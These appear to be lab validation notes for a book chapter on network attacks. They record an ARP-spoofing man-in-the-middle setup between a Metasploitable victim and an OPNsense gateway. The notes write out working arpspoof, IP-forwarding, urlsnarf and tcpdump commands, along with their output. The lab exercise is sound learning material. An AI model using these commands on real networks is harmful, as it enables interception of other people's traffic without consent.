# Validation Notes – Chapter 2

## Host Discovery

Kali discovered the two important lab hosts:

```text
192.168.1.1      OPNsense / gateway
192.168.1.121    Metasploitable / victim
```

## IP Forwarding

Kali IP forwarding was enabled:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```

Output:

```text
1
```

## ARP Spoofing

Two `arpspoof` sessions were run from Kali.

Session 1:

```bash
sudo arpspoof -i eth0 -t 192.168.1.121 192.168.1.1
```

Session 2:

```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.121
```

Both sessions displayed repeated ARP replies, indicating that spoofed ARP replies were being sent continuously.

## urlsnarf

`urlsnarf` was started with root privileges:

```bash
sudo urlsnarf -i eth0
```

It entered listening mode:

```text
urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
```

However, it did not display the expected captured URL output shown in the book.

## HTTP Traffic Generation

From Metasploitable:

```bash
wget http://192.168.1.1
```

Metasploitable successfully connected to OPNsense on port 80:

```text
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://192.168.1.1/
```

## tcpdump Validation

Because `urlsnarf` did not show the expected output, `tcpdump` was used to confirm visibility:

```bash
sudo tcpdump -i eth0 host 192.168.1.121 and port 80
```

Captured evidence included:

```text
192.168.1.121.58833 > OPNsense.internal.http
HTTP: GET / HTTP/1.0
```

## Result

The ARP spoofing/on-path setup was validated successfully.

Even though `urlsnarf` did not display the book-style output, `tcpdump` confirmed that Kali could observe HTTP traffic between Metasploitable and the gateway.
